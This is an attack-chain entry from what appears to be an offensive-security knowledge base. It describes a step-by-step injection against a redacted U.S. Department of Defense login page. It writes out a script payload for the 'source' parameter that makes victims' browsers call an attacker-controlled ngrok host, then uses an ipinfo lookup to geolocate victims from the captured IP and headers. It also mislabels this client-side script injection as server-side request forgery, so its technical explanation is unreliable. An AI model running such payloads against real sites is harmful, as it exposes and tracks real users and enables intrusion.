---
id: ac-ssrf-dod-fetch-exfil
tags:
  - ssrf
  - xss
  - javascript
  - fetch-api
  - ip-exfiltration
  - geolocation
  - dod
type: attack_chain
tools:
  - '[[tools/ngrok]]'
  - '[[tools/Firefox-Browser]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-Ngrok-Listener-For-SSRF-Capture]]'
  - '[[procedures/Craft-JavaScript-Fetch-SSRF-Payload]]'
  - '[[procedures/Inject-SSRF-Payload-Into-Login-Page-Source-Parameter]]'
  - '[[procedures/Access-Malicious-URL-and-Capture-Victim-Request]]'
  - '[[procedures/Analyze-Captured-Data-and-Trace-Victim-Geolocation]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:01.850Z'
description: >-
  Multi-stage SSRF attack on a U.S. Department of Defense login page using
  injected JavaScript fetch API to route requests to an attacker-controlled
  ngrok server, exposing victim IP, browser info, OS, and enabling geolocation
  tracing.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# SSRF in DoD Login Page via JavaScript Fetch to Exfiltrate Victim IP and Browser Details

Multi-stage attack chain demonstrating a Server-Side Request Forgery (SSRF) vulnerability in the U.S. Department of Defense website's login page. The attack injects a JavaScript payload using the fetch API into the 'source' parameter, forcing the server to make cross-domain requests to an attacker-controlled ngrok server. This exposes the victim's IP address, browser information, operating system, and other headers, allowing geolocation tracing and potential further reconnaissance like port scanning.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Listener] --> B[Craft Payload]
    B --> C[Inject into URL]
    C --> D[Access and Capture]
    D --> E[Analyze and Trace]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ngrok]]
- [[tools/Firefox-Browser]]

### Target Environment

- Web platform
- Access to public-facing DoD login page (e.g., https://www.█████████)
- No authentication required for initial access

### Initial Access Requirements

- Public internet access
- Attacker-controlled server (via ngrok)
- Victim simulation on a separate device

## Detailed Attack Procedures

### Step 1: Set Up Listener
procedure: [[procedures/Set-Up-Ngrok-Listener-For-SSRF-Capture]]

**Objective**: Establish an external endpoint to capture SSRF requests from the target server.

**Instructions**: Start ngrok to create a tunnel and obtain a public URL for listening to incoming requests.

**Expected Output**: Ngrok provides a forwarding URL (e.g., https://abc123.ngrok.io) and a local web interface at http://127.0.0.1:4040.

**Success Indicators**:
- Ngrok tunnel active
- Web interface accessible

### Step 2: Craft Payload
procedure: [[procedures/Craft-JavaScript-Fetch-SSRF-Payload]]

**Objective**: Create a JavaScript injection that uses the fetch API to send data to the ngrok listener.

**Instructions**: Construct the payload string: '><script>fetch('https://your-ngrok-instance.ngrok.io')</script>' for injection into the source parameter.

**Expected Output**: Valid JavaScript payload ready for URL encoding if needed.

**Success Indicators**:
- Payload syntax verified
- Fetch target matches ngrok URL

### Step 3: Inject Payload
procedure: [[procedures/Inject-SSRF-Payload-Into-Login-Page-Source-Parameter]]

**Objective**: Append the payload to the login page URL's source parameter to trigger SSRF on server-side processing.

**Instructions**: Modify the base URL by adding &source='><script>fetch('https://your-ngrok-instance.ngrok.io')</script>' to the query string.

**Expected Output**: Full malicious URL constructed, e.g., https://www.█████████&source='><script>fetch('https://abc123.ngrok.io')</script>&server=submit.moboard.com.

**Success Indicators**:
- URL includes injected payload
- No immediate errors in URL formation

### Step 4: Access and Capture
procedure: [[procedures/Access-Malicious-URL-and-Capture-Victim-Request]]

**Objective**: Simulate victim access to trigger the SSRF and capture the request on ngrok.

**Instructions**: Open the malicious URL in a browser on a separate device while monitoring ngrok interface.

**Expected Output**: Incoming request logged in ngrok web interface with victim details.

**Success Indicators**:
- Request appears in ngrok
- Victim IP and headers captured

### Step 5: Analyze and Trace
procedure: [[procedures/Analyze-Captured-Data-and-Trace-Victim-Geolocation]]

**Objective**: Examine captured data for reconnaissance and perform IP geolocation.

**Instructions**: Review headers in ngrok, then use [[commands/curl-ipinfo-geolocation]] to trace the IP.

```bash
curl ipinfo.io/IP-address-of-victim
```

**Expected Output**: JSON with geolocation data (city, region, country, coordinates).

**Success Indicators**:
- Victim details extracted
- Location traced accurately

## Attack Chain Summary

### Key Achievements

1. Successful SSRF injection via JavaScript fetch API
2. Capture of victim IP, browser, and OS information
3. Geolocation tracing enabling physical location approximation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Reconnaissance]]

---

*Last updated: 2023-10-01T00:00:00Z*
